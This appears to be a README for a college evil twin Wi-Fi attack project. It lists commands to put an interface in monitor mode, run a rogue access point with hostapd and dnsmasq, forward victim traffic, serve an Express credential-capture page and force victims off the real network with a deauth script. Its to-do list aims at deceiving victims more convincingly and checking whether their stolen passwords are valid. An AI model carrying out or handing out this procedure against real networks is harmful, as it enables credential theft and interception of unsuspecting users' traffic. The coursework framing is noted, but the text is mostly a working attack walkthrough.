# Evil Twin Attack
------------
#### Short info
'Ewil Twin Attack' is college project for Security of wireless networks course.
Some of the technologies used in this project are: 
  - Python, Scapy
  - Hostapd, Dnsmasq
  - Express.js
  - HTML, CSS, JavaScript
  - Linux (Kali)
 
---------
#### Demo
Setting up the attack:
> Check out your interfaces
```
$ iwconfig
```
> Kill processes that could cause trouble
```
$ airmon-ng check kill
```
> Put interface in monitor mode
```
$ airmon-ng start <interface>
```
> Modify hostapd.conf parameters and then start access point
```
$ hostapd hostapd.conf
```
> Assign the network Gateway and netmask to the interface and add the routing table
```
$ ifconfig <interface> up 192.168.1.1 netmask 255.255.255.0
$ route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
> Modify dnsmasq.conf parameters and then start dnsmasq
```
$ dnsmasq -C dnsmasq.conf -d
```
> Provide your victim with internet access. 
Forward traffic from one interface to another and enable traffic forwarding
```
$ iptables --table nat --append POSTROUTING --out-interface <out-interface> -j MASQUERADE
$ iptables --append FORWARD --in-interface <in-interface> -j ACCEPT
$ echo 1 > /proc/sys/net/ipv4/ip_forward
```
> Install dependencies, create `.env` file with PORT=80, and run the server
```
$ npm install
$ npm start
```
> If you want force connection run `deauth.py` (disconnect victim from real access point)
```
$ python deauth.py
```

#### To-do
 - Automating script for running and configuring hostapd, dnsmasq and traffic forwarding
 - Better and more convincing way of dealing with victim if credentials are true of false
 - Find new way of checking if credentials are correct (response size is not reliable)
